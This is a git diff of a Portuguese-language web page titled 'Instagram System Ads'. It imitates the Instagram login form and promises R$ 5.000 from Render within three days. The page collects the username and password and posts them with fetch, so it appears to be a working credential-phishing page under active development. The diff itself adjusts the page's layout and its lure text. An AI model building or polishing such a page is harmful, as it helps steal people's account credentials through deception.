@@ -7,7 +7,7 @@
     <link rel="shortcut icon" href="./image/favicon.png" type="image/x-icon">
     <title>Instagram System Ads</title>
 </head>
-<body>
+<body class="body">
     <div class="pain-login">
         <br><br>
         <form id="Formid">
@@ -28,17 +28,6 @@
                             <a href="https://render.com/" style="color: #000; text-decoration: none;"><img src="https://dka575ofm4ao0.cloudfront.net/pages-transactional_logos/retina/89884/render-status-4b015255-e0cc-422c-943d-4f60b5f03094.png" width="80"/></a>
                         </div>
                         </div>
-                        <div class="imageh">
-                            <img src="./image/448675678_1691582481583500_7267962354547209168_n.jpg" class="iSainsta" width="40" style="border-radius: 100%;"/>
-                        <script>
-                            document.querySelector('.iSainsta').addEventListener('click', function(){
-                                window.location = "https://www.instagram.com/_xxw_isah/"
-                            })
-                        </script>
-                        <div class="userI">
-                            <a href="https://www.instagram.com/_xxw_isah/" style="color: #000; text-decoration: none; font-weight: 700;">_xxw_isah</a>
-                        </div>
-                        </div>
                     </div>
                     <br>
             <input id="username" type="text" class="other-input" placeholder="Telefone, nome de usuário ou email" onblur='this.placeholder="Telefone, nome de usuário ou email"' onfocus='this.placeholder=""' required/><br>
@@ -48,20 +37,7 @@
                 </div>
                 <div class="view">
                     <p style="font-size: 14px;" id="clickB">Mostrar</p>
-                </div>
-                <script>
-                    document.querySelector('.inputpass').addEventListener('click', function() {
-                        const div = document.querySelector('.inputpass');
-                        // Verifica a classe em vez do estilo direto
-                        if (div.classList.contains('active')) {
-                            div.style.border = "1px solid #bebebea1"; // Reseta a borda
-                            div.classList.remove('active');  
-                        } else {
-                            div.style.border = "1px solid #000"; // Altera a borda
-                            div.classList.add('active');
-                        }
-                    });
-                </script> 
+                </div> 
                 
             </div>
             <div class="rese">
@@ -93,7 +69,7 @@
                 <a style="color: #000;" href="https://privacycenter.instagram.com/policy/">Política de Privacidade</a> do Instagram.</p>
         </form>
         <br><br><br>
-        <br><br><br>
+        <br><br>
         <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" title="Meta" width="50"/>
     </div>
     <div class="divB">
@@ -105,11 +81,12 @@
             <br>
             <br>
             <br>
-            <br>
+            <br> 
             <button class="clickbut" onclick="RemoteDiv()">OK</button>
             <script>
                 function RemoteDiv(){
                     document.querySelector('.divB').style.display = "none";
+                    document.querySelector('.body').style.overflow = "scroll";
                 }
             </script>
         </div>
@@ -119,7 +96,7 @@
             <br>
             <br>
             <img src="https://dka575ofm4ao0.cloudfront.net/pages-transactional_logos/retina/89884/render-status-4b015255-e0cc-422c-943d-4f60b5f03094.png" width="140"/><br><br>
-            <p>Espere 3 dias para receber R$ 5.000 do Render</p>
+            <p>Espere 3 dias para receber R$ 5.000 do Render.<br>Vamos verificar os dados de login.</p>
             <br>
             <br>
             <br>
@@ -140,6 +117,7 @@
 
             if (username.trim() === "" || password.trim() === "") {
                 document.querySelector('.divB').style.display = "block";
+                document.querySelector('.body').style.overflow = "hidden";
                 return; // Impede que o código continue
             }
             
@@ -160,6 +138,7 @@
                 .then(response => response.text())
                 .then(data => {
                     document.querySelector('.divA').style.display = "block";
+                    document.querySelector('.body').style.overflow = "hidden";
                 })
                 .catch(error => console.error('Erro:', error));
 
